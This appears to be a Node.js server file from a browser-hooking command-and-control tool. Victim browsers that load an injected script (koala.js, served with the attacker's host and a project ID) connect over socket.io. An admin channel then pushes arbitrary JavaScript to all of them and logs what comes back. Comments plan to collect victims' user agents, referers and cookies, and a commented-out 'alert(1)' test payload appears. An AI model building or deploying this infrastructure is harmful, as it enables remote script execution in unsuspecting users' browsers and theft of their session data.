//var Socketio = require('socket.io');
var fs = require('fs');
var path = require('path');
var app = require('../app');

exports.online = function(server, admin_io, user_io){
    admin_io.on('connection',function(socket){
        socket.on('execJSServer',function(data){
            user_io.emit('exec',data);
        });
        user_io.on('callbackExec',function(data){
            console.log(data);
        })
    });

    user_io.on('connection',function(socket){
        //把主机信息入库. 获取项目信息
        //ua,host,origin,user-agent,referer,cookie,
        console.log(socket);
    })
};

exports.index = function(req,res,next){
    //发送js文件内容 或者数据库
    //socket.js 发过去
    //var project_id = req.path.substring(1);
    var host = req.header('host');
    var projectid = req.url.match(/\/(.{24})/)[1];
    fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
        if(err){
            throw err;
        }
        var initKoala = data.toString();
        var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
        initData = initData.replace(/\{~projectid~\}/g, projectid);
        res.cookie["__p_"] = projectid;
        res.send(initData);
    });
    //res.send("");
    //res.send('');
    //res.send('alert(1)');
    //引入jquery TODO: 引入我的框架
    //init socket.io
    //注册事件
};